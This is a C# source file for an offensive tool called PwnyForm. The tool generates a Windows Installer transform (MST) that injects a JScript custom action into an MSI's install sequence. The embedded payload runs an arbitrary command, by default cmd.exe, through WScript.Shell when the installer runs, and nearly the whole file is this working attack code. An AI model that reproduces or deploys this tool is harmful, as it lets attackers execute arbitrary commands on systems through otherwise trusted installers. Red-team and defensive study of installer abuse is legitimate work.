
using System;
using System.IO;
using System.Text;
using Microsoft.Deployment.WindowsInstaller;
using Mono.Options;

namespace PwnyForm {
    class Program {

        public enum SequenceType {
            UI,
            Execute
        }

        static string caCode = @"function runCommand(){	
	                            var cmd;	
	                            if(typeof Session !== 'undefined'){
		                            cmd = Session.Property('CMD');
                                }	
	                            if(cmd == null){
		                            cmd = 'cmd.exe';
	                            }
                                var shell = new ActiveXObject('WScript.Shell');
                                shell.run(cmd, 1, false);
                            }";

        static void Main(string[] args) {

            string msi = null;
            string mst = null;
            int order = 1;
            bool showHelp = false;
            SequenceType sequenceType = SequenceType.UI;
            string sequenceTable = "InstallUISequence";

            Console.WriteLine(
                 "PwnyForm by @_EthicalChaos_\n" +
                 $"  Generates MST transform to inject arbitrary commands/cutom actions when installing MSI files\n"
                );

            OptionSet option_set = new OptionSet()
                .Add("m=|msi=", "MSI file to base transform on (required)", v => msi = v)
                .Add("t=|mst=", "MST to generate that includes new custom action (required)", v => mst = v)
                .Add<SequenceType>("s=|sequence=", "Which sequence table should inject the custom action into (UI (default) | Execute)", v => sequenceType = v) 
                .Add<int>("o=|order=", "Which sequence number to use (defaults 1)", v => order = v)                
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp || msi == null || mst == null) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            switch (sequenceType) {
                case SequenceType.UI:
                    sequenceTable = "InstallUISequence";
                    break;
                case SequenceType.Execute:
                    sequenceTable = "InstallExecuteSequence";
                    break;
            }

            string tmpMsi = Path.GetTempFileName();

            try {

                File.Copy(msi, tmpMsi, true);
                using (var origDatabase = new Database(msi, DatabaseOpenMode.ReadOnly)) {
                    using (var database = new Database(tmpMsi, DatabaseOpenMode.Direct)) {

                        if (!database.Tables.Contains("Binary")) {
                            Console.WriteLine("[-] Binary table missing, creating...");

                            TableInfo ti = new TableInfo("Binary",
                                new ColumnInfo[] {  new ColumnInfo("Name","s72"),
                                                new ColumnInfo("Data", "v0") },
                                new string[] { "Name" });

                            database.Tables.Add(ti);
                        }

                        if (!database.Tables.Contains("CustomAction")) {
                            Console.WriteLine("[-] CustomAction table missing, creating...");

                            TableInfo ti = new TableInfo("CustomAction",
                                new ColumnInfo[] {  new ColumnInfo("Action","s72"),
                                                new ColumnInfo("Type", "i2"),
                                                new ColumnInfo("Source", typeof(string), 72, false),
                                                new ColumnInfo("Target", typeof(string), 255, false),
                                                new ColumnInfo("ExtendedType", typeof(int), 4, false)}
                                ,
                                new string[] { "Action" });

                            database.Tables.Add(ti);
                        }

                        if (!database.Tables.Contains(sequenceTable)) {
                            Console.WriteLine($"[!] The sequence table {sequenceTable} does not exist, is this a proper MSI file?");
                            return;
                        }

                        Console.WriteLine($"[+] Inserting Custom Action into {sequenceTable} table using sequence number {order}");

                        Record binaryRecord = new Record(2);
                        binaryRecord[1] = "Pwnd";
                        binaryRecord.SetStream(2, new MemoryStream(Encoding.UTF8.GetBytes(caCode)));
                        database.Execute("INSERT INTO `Binary` (`Name`, `Data`) VALUES (?, ?)", binaryRecord);
                        database.Execute("INSERT INTO `CustomAction` (`Action`, `Type`, `Source`, `Target`) VALUES ('Pwnd', 5, 'Pwnd', 'runCommand')");
                        database.Execute($"INSERT INTO `{sequenceTable}` (`Action`, `Sequence`) VALUES ('Pwnd', {order})");

                        Console.WriteLine($"[+] Generating MST file {mst}");

                        database.GenerateTransform(origDatabase, mst);
                        database.CreateTransformSummaryInfo(origDatabase, mst, TransformErrors.None, TransformValidations.None);

                        Console.WriteLine("[+] Done!");
                    }
                }
            }catch(Exception e) {
                Console.WriteLine($"[!] Failed to generate MST with error {e.Message}");
            }
        }
    }
}
